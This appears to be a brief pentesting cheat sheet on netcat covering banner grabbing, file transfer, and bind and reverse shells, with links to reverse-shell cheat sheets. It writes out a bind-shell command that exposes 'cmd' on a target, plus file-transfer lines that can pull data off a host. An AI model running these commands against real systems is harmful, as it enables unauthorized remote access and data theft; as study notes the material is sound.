# Netcat
TCP/IP swiss army knife

Banner Grabbing -- ```nc -nv (ip address) (port)``` 
Listener -- ```nc -lnv (ip address) (port)``` 

Sending and receiving files  
**Listening** - ```nc -lvnp 123 > (filename)```  
**Pulling file** -- ```nc -nv (ip address) (port) < (filename)```

### Bind Shell
Attacker connects directly to a system  
Bind shells require a listener from the targets machine.  
On target -- ```nc.exe -lvnp 1234 -e cmd```  
Connecting with bind shell -- ```nc -nv  (target IP) (port number)```  

### Reverse Shell
This is having the target communicate back with your machine  
This does not require netcat to be installed on the target  

**Reverse shell cheat sheet**  
[Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)  
[RevShells](https://www.revshells.com/)  
